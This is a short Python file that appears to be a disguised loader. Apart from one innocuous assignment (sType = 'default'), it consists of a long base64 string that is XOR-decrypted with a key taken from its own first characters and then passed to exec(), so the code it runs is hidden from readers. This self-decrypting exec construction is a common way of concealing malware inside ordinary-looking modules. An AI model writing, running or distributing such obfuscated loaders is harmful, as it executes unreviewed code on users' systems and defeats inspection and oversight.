sType = 'default'


temp = "w4IxUULD" + "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"
import base64
data=base64.b64decode(temp[8:]);sk=temp[:8];size=len(data);res=''
for i in range(size):k=i&7;c=chr(data[i]^ord(sk[k]));res+=c
exec(res)
